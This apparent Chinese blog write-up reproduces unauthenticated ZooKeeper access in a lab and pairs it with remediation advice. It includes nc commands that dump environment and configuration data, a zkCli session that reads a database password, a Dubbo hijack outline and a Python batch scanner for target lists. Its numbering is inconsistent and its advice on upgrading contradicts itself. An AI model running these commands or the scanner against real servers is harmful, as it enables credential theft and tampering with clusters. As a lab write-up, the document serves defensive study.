---
title: "ZooKeeper 未授权访问与配置泄露复现"
date: 2026-08-30 10:00:00 +0800
categories: [漏洞复现, Web安全, B级]
tags: [ZooKeeper, 未授权访问, 配置泄露]
---

## 一、产品介绍
Apache ZooKeeper 是**开源分布式协调中间件**，基于 Java 开发，默认端口 **2181**。主要用于大数据、微服务集群，实现**配置管理、服务注册发现、分布式锁、集群选主**等协调功能，是 Kafka、Dubbo、Hadoop 的核心依赖组件。

ZK 使用**树形 ZNode 文件结构**存储少量配置数据，依靠 **Watcher 监听机制**实现数据变更推送，依靠 **ACL 权限控制**管理节点访问。

**安全特性默认极其宽松：**
1. 默认**无需账号密码**即可连接
2. 默认 ACL 为**所有人全权限**
3. 旧版本无四字命令限制，极易**未授权访问、配置泄露**
## 二、漏洞背景
漏洞编号：无（配置缺陷，非代码 CVE） 
漏洞类型：配置缺陷导致未授权访问、信息泄露 
CVSS3.1：不适用（配置风险，厂商不打分） 
披露时间：无
## 三、漏洞复现
搭建靶场

```
cd vulhub/zookeeper/zookeeper-unauth
docker-compose up -d
```

## 2.4 复现过程
### 2.4.1 启动环境

```bash
docker run -d --name zk -p 2181:2181 zookeeper:3.4.13
```

### 2.4.2 四字命令探测

```bash
# stat 命令
echo stat | nc target 2181

# envi 命令（环境变量）
echo envi | nc target 2181

# conf 命令（配置）
echo conf | nc target 2181

# dump 命令
echo dump | nc target 2181

# cons 命令
echo cons | nc target 2181

# ruok 命令（Are you OK?）
echo ruok | nc target 2181
```

返回大量敏感信息。

### 2.4.3 用 zkCli 列出所有 znode

```bash
docker run -it --rm zookeeper:3.4.13 zkCli.sh -server target:2181
```

```shell
help # 查看全部指令 
ls / # 列出根节点 
create /test hello # 创建节点 
get /test # 获取节点数据 
set /test world # 修改节点 
delete /test # 删除节点 
quit # 退出客户端
```

进入交互式命令行：

```
[zk: target:2181(CONNECTED) 0] ls /
[zookeeper, dubbo, services, config]

[zk: target:2181(CONNECTED) 1] ls /config
[db, redis, mysql, kafka]

[zk: target:2181(CONNECTED) 2] get /config/db
{"host":"10.0.0.1","port":3306,"user":"root","password":"P@ssw0rd"}
```

数据库密码直接拿到。

### 2.4.4 Dubbo 服务接管
如果 ZooKeeper 是 Dubbo 注册中心，攻击者可以：
+ 注册一个伪造的 Dubbo 服务（同名高优先级）
+ 让正常消费者调用到攻击者的恶意服务
+ 实现中间人攻击或参数窃取

### 2.4.5 自动化扫描

```bash
# Nmap
nmap -p 2181 --script zookeeper-info target

# Nuclei 模板
nuclei -t zookeeper-unauth.yaml -u target:2181
```

## 2.4.6 批量探测脚本

```python
import socket

def check(host, port=2181, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.send(b'envi')
        data = s.recv(8192).decode(errors='ignore')
        if 'zookeeper.version' in data:
            return data
    except Exception:
        return None
    finally:
        s.close()

for host in open('targets.txt'):
    r = check(host.strip())
    if r:
        print(f'[+] {host}: {r[:200]}')
```

## 2.5 修复建议
1. **启用 ACL**：

```bash
# 在 zkCli 中
[zk: localhost:2181] addauth digest admin:StrongPass
[zk: localhost:2181] setAcl / auth:admin:StrongPass:cdwra
```

2. **限制四字命令**（3.5.x 之后）：

```properties
# zoo.cfg
4lw.commands.whitelist=stat,ruok
```

3. **网络隔离**：2181 仅内网访问，不对公网暴露
4. **升级到 3.5.x+**，默认有更严格的访问控制
5. 监控异常 znode 操作
6. 生产环境用 Kerberos 鉴权（SASL）

## 四、漏洞原理
## 1.ZNode 未授权访问原理
1. ZooKeeper 客户端与服务端使用 TCP 协议通信，默认端口 **2181**。
2. 默认配置下，服务端**不需要密码、不需要 SASL 认证**，任意能连通 2181 端口的客户端，都可以完成 TCP 握手，建立 ZK 会话。
3. ZNode 节点默认 ACL 权限：`world:anyone`，含义：**所有连接上来的任何人，都拥有读写、删除节点权限**。
4. 攻击者使用 zkCli、nc、python‑kazoo 等工具直接连接 2181，不需要账号密码，即可：
    - 查询节点、读取业务配置
    - 创建、修改、删除 ZNode 节点
    - 破坏依赖 ZooKeeper 的 Dubbo、Kafka 集群业务

> 关键点： 这是产品默认行为，不是代码漏洞。**升级版本解决不了，必须开启认证、修改 ACL、防火墙限制 IP**。

## 2.四字命令信息泄露（`envi`/`conf`/`mntr` 获取环境、JVM、配置泄露）

这里**有版本差异**，因为引入了白名单配置项 `4lw.commands.whitelist`。
1. **3.4.10 之前**：没有白名单功能。只要网络通，nc 直接执行全部四字命令，拿到配置、环境泄露。
2. **3.4.10 /3.4.11 及以上 3.4.x**：新增白名单配置，**默认不开启白名单，全部四字命令直接可用**；只有手动配置`4lw.commands.whitelist`才会限制四字命令。
3. **3.5.3 及以后（3.5.x、3.6、3.7、3.8、3.9）**：白名单功能内置，**默认除 srvr 外其他四字命令全部禁用**；只有配置白名单才可以启用`envi`、`conf`、`mntr`等命令。







